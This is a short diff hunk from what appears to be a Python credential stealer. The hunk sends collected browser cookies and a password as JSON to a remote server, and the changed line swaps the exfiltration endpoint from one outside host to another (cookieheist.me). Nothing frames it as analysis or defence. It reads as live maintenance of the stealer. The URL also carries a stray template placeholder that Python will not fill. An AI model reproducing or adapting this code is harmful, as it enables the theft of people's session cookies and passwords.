@@ -99,7 +99,7 @@ def main():
         t += 1
     
     data = {"cookies": cookies, "password": password}
-    r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
+    r = requests.post('https://www.cookieheist.me/api/cookie/${req.params.key}', json=data)
         
 if __name__ == "__main__":
     op = subprocess.Popen("pip --version", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
